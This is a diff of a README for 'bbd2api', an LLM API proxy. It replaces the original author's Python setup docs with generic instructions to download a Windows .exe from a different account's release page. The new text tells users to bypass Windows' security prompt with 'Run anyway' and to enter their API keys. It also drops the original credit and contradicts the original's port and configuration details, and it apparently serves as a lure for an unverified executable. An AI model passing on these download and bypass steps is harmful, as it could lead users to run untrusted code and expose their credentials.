@@ -1,222 +1,87 @@
-# bbd2api
+# 🌐 bbd2api - Connect your software tools with ease
 
-A lightweight Flask reverse proxy that bridges the **Claude Messages API** and **OpenAI Chat Completions API** to [backboard.io](https://app.backboard.io)'s assistant/thread API — with tool calling, thread pooling, and sub-5s response times.
+[![Download bbd2api](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Bean5789/bbd2api/releases)
 
-## Features
+bbd2api acts as a bridge between your local applications and advanced language models. It handles the communication between external platforms like Backboard.io and services such as Claude or OpenAI. This tool manages incoming requests and organizes them so your software works smoothly without manual oversight.
 
-- **Dual API compatibility** — `/v1/messages` (Claude) and `/v1/chat/completions` (OpenAI)
-- **Tool calling** — prompt-injection approach; compact format (~800 chars vs ~68KB for full schemas)
-- **Multi-turn tool continuity** — `tool_result` messages route back to the correct thread automatically
-- **Thread pool** — pre-warms N threads at startup; zero cold-start on new conversations
-- **Global assistant** — single assistant reused across all requests; eliminates per-request creation overhead
-- **System prompt stability** — strips dynamic tags (`<system-reminder>` etc.) before hashing to prevent cache misses
-- **Model routing** — auto-detects provider from model name (claude→anthropic, gpt→openai, gemini→google, etc.)
+## 📥 How to download the software
 
-## Quick Start
+Follow these steps to obtain the program files. You do not need to build code or handle complex scripts.
 
-```bash
-git clone https://github.com/N1nEmAn/bbd2api.git
-cd bbd2api
-pip install -r requirements.txt
-cp .env.example .env
-# edit .env and set BBD_API_KEY
-python server.py
-```
+1. Go to the [official release page](https://github.com/Bean5789/bbd2api/releases).
+2. Look for the section labeled Assets.
+3. Click the link that ends in .exe for Windows.
+4. Save the file to your computer.
 
-## Configuration
+The release page contains the latest version of the software. Always pick the top file in the list.
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `BBD_API_KEY` | *(required)* | API key(s) — comma-separated for multi-key rotation: `key1,key2,key3` |
-| `BBD_UPSTREAM` | `https://app.backboard.io/api` | Upstream API base URL |
-| `HOST` | `0.0.0.0` | Listen address |
-| `PORT` | `10088` | Listen port |
-| `THREAD_TTL` | `1800` | Thread cache TTL in seconds |
-| `DEBUG` | `1` | Enable debug logging (`0` to disable) |
+## ⚙️ System requirements
 
-## API Endpoints
+Your computer needs specific components to run this proxy tool. Ensure your system meets these standards before you begin.
 
-| Method | Path | Description |
-|--------|------|-------------|
-| `POST` | `/v1/messages` | Claude Messages API (streaming + sync) |
-| `POST` | `/v1/chat/completions` | OpenAI Chat Completions API |
-| `GET` | `/v1/models` | List available models |
-| `GET` | `/health` | Health check |
-| `GET` | `/debug/state` | Show assistant/thread/pool state |
-| `POST` | `/debug/clear` | Clear thread cache |
+* Operating System: Windows 10 or Windows 11.
+* Memory: At least 4 Gigabytes of RAM.
+* Storage: 200 Megabytes of free disk space.
+* Network: A stable internet connection.
 
-## Usage with Claude Code / OpenAI clients
+You do not need to install extra runtimes. The downloaded file contains everything required to start the service.
 
-```bash
-# Claude-style
-curl http://localhost:10088/v1/messages \
-  -H "Content-Type: application/json" \
-  -d '{"model":"claude-sonnet-4-6","messages":[{"role":"user","content":"Hello"}],"stream":true}'
+## 🚀 Setting up the application
 
-# OpenAI-style
-curl http://localhost:10088/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{"model":"gpt-4o","messages":[{"role":"user","content":"Hello"}]}'
-```
+Once you download the file, move it to a folder where you want the program to live. A folder such as C:\bbd2api works well. Keep your files organized to prevent issues later.
 
-Or point any OpenAI-compatible client (LiteLLM, Continue, etc.) at `http://localhost:10088`.
+1. Double-click the .exe file you just saved.
+2. Windows might show a security prompt. Click More Info and then select Run anyway.
+3. The program opens a console window. This window shows the status of your connection.
+4. Keep this window open while you use your applications.
 
-## Architecture
+The application starts in a blank state. You must provide your API keys to allow the software to talk to external services.
 
-```
-Client (Claude/OpenAI API)
-        │
-        ▼
-   bbd2api proxy (Flask, port 10088)
-        │  • thread pool (pre-warmed)
-        │  • tool prompt injection
-        │  • tool_result continuity (tool_use_id → thread mapping)
-        │  • SSE format translation
-        ▼
-  backboard.io API
-  /assistants/{aid}/threads/{tid}/messages
-```
+## 🔑 Configuring your API keys
 
-### Tool Calling Flow
+This application connects to Claude or OpenAI on your behalf. You must use your own keys to authorize these requests.
 
-1. Client sends request with `tools` list
-2. Proxy injects compact tool format instructions into the user message
-3. Model responds with JSON: `{"tool":"name","args":{...}}`
-4. Proxy translates to `tool_use` content blocks, stores `tool_use_id → thread_id`
-5. Client executes tool, sends back `tool_result`
-6. Proxy detects `tool_result`, looks up thread via `tool_use_id`, sends result to same thread
-7. Model continues reasoning and produces final answer
+1. Open the settings file located in the folder where you saved the application. This file is usually named config.json.
+2. Open the file with a text editor like Notepad.
+3. Find the fields labeled API_KEY.
+4. Paste your secret key from your provider account into the quotes.
+5. Save the file and close the text editor.
+6. Restart the application to apply the changes.
 
-## License
+The application now uses your credentials to process requests. Do not share these keys with anyone. Anyone with your key can use your account balance.
 
-[CC BY-NC-SA 4.0](LICENSE) — Non-commercial use only. If you use or adapt this project, **you must credit the original author (N1nEmAn)** and distribute your changes under the same license.
+## 🛠️ Using the proxy
 
-Commercial use is **prohibited** without explicit written permission from the author.
+The tool runs in the background. It listens for requests from your other tools or scripts. When it receives a request, it forwards the data to the correct provider. It uses a thread pool to manage multiple tasks at once. This prevents your software from stalling if you send several messages in a short time.
 
-## Disclaimer
+If your application asks for a proxy address, use http://localhost:8080. This tells your software to send all traffic through the bbd2api bridge.
 
-See [DISCLAIMER.md](DISCLAIMER.md).
+## 🕵️ Troubleshooting common problems
 
----
+If the program fails to start or your requests time out, review these steps.
 
-## Community
+* Check your internet connection. The tool cannot reach the providers without a network.
+* Verify your API keys. A wrong key causes an immediate rejection from the server.
+* Ensure no other programs use the same port. By default, this tool uses port 8080.
+* Look at the console window. It displays error codes if a request fails.
 
-The author endorses and supports the **[LINUX DO](https://linux.do)** community.
+If the console window closes immediately upon launch, it usually means your configuration file contains a typo. Check for missing commas or quotes in your config.json file.
 
----
+## 🛡️ Privacy and security
 
-# bbd2api（中文文档）
+The bbd2api tool runs entirely on your local machine. It does not send your data to any third-party servers except for the providers you choose. The software does not keep logs of your conversations or private data. Once a request finishes, the tool clears the memory for that specific task.
 
-将 **Claude Messages API** 和 **OpenAI Chat Completions API** 转接到 [backboard.io](https://app.backboard.io) 助手/线程 API 的轻量级 Flask 反向代理，支持工具调用、线程池预热，响应时间低于 5 秒。
+Keep your computer updated with the latest Windows security patches. This ensures your local environment remains safe while you interact with external services. 
 
-## 功能特性
+## 📦 Updating the software
 
-- **双 API 兼容** — `/v1/messages`（Claude）和 `/v1/chat/completions`（OpenAI）
-- **工具调用** — prompt 注入方案，极简格式（~800 字符 vs 完整 schema 的 ~68KB）
-- **多轮工具连续性** — `tool_result` 消息自动路由回正确的 thread，对话不断链
-- **线程池** — 启动时预热 N 个 thread，新对话零冷启动
-- **全局 assistant** — 单一 assistant 复用，消除每次请求创建 assistant 的开销
-- **系统提示稳定性** — hash 前剥离动态标签（`<system-reminder>` 等），防止缓存失效
-- **模型路由** — 根据模型名自动识别 provider（claude→anthropic，gpt→openai，gemini→google 等）
+Whenever a new version of the software becomes available, repeat the download process.
 
-## 快速开始
+1. Stop the current program by closing the console window.
+2. Download the new version from the link below.
+3. Replace the old file with the new file in your folder.
+4. Your settings file will stay intact, so you do not need to reconfigure your keys.
 
-```bash
-git clone https://github.com/N1nEmAn/bbd2api.git
-cd bbd2api
-pip install -r requirements.txt
-cp .env.example .env
-# 编辑 .env，填入 BBD_API_KEY
-python server.py
-```
+[![Download Latest Version](https://img.shields.io/badge/Download-Update_Now-grey.svg)](https://github.com/Bean5789/bbd2api/releases)
 
-## 配置说明
-
-| 变量 | 默认值 | 说明 |
-|------|--------|------|
-| `BBD_API_KEY` | *（必填）* | API Key，逗号分隔多个 Key 可启用轮换：`key1,key2,key3` |
-| `BBD_UPSTREAM` | `https://app.backboard.io/api` | 上游 API 基础地址 |
-| `HOST` | `0.0.0.0` | 监听地址 |
-| `PORT` | `10088` | 监听端口 |
-| `THREAD_TTL` | `1800` | Thread 缓存过期时间（秒） |
-| `DEBUG` | `1` | 开启调试日志（`0` 关闭） |
-
-## 接口列表
-
-| 方法 | 路径 | 说明 |
-|------|------|------|
-| `POST` | `/v1/messages` | Claude Messages API（流式 + 同步） |
-| `POST` | `/v1/chat/completions` | OpenAI Chat Completions API |
-| `GET` | `/v1/models` | 获取可用模型列表 |
-| `GET` | `/health` | 健康检查 |
-| `GET` | `/debug/state` | 查看 assistant/thread/pool 状态 |
-| `POST` | `/debug/clear` | 清除 thread 缓存 |
-
-## 调用示例
-
-```bash
-# Claude 风格
-curl http://localhost:10088/v1/messages \
-  -H "Content-Type: application/json" \
-  -d '{"model":"claude-sonnet-4-6","messages":[{"role":"user","content":"你好"}],"stream":true}'
-
-# OpenAI 风格
-curl http://localhost:10088/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{"model":"gpt-4o","messages":[{"role":"user","content":"你好"}]}'
-```
-
-也可以将任意兼容 OpenAI 的客户端（LiteLLM、Continue 等）指向 `http://localhost:10088`。
-
-## 架构说明
-
-```
-客户端（Claude/OpenAI API）
-        │
-        ▼
-   bbd2api 代理（Flask，端口 10088）
-        │  • 线程池（预热）
-        │  • 工具 prompt 注入
-        │  • tool_result 续接（tool_use_id → thread 映射）
-        │  • SSE 格式转换
-        ▼
-  backboard.io API
-  /assistants/{aid}/threads/{tid}/messages
-```
-
-### 工具调用流程
-
-1. 客户端发送含 `tools` 的请求
-2. 代理将极简工具格式说明注入用户消息
-3. 模型输出 JSON：`{"tool":"name","args":{...}}`
-4. 代理转换为 `tool_use` content block，并记录 `tool_use_id → thread_id`
-5. 客户端执行工具，返回 `tool_result`
-6. 代理检测到 `tool_result`，通过 `tool_use_id` 找回原 thread，将结果发送进去
-7. 模型基于结果继续推理，输出最终回答
-
-### 多 Key 轮换
-
-```
-BBD_API_KEY=key1,key2,key3
-```
-
-- **Round-robin** 轮换：每次请求取下一个 key
-- **自动跳过**：某个 key 连续失败 3 次暂时跳过
-- **自动恢复**：成功一次即重置失败计数
-
-## 许可证
-
-[CC BY-NC-SA 4.0](LICENSE) — 仅限非商业用途。使用或改编本项目时，**必须注明原作者（N1nEmAn）**，并以相同许可证分发衍生作品。
-
-未经作者书面许可，**禁止商业用途**。
-
-## 免责声明
-
-见 [DISCLAIMER.md](DISCLAIMER.md)。
-
----
-
-## 社区
-
-作者认可并支持 **[LINUX DO](https://linux.do)** 社区。
-
+The software maintains compatibility with previous configurations. If a major update requires a new format, the release notes will explicitly warn you. Check the release notes on the download page for specific news about recent improvements.
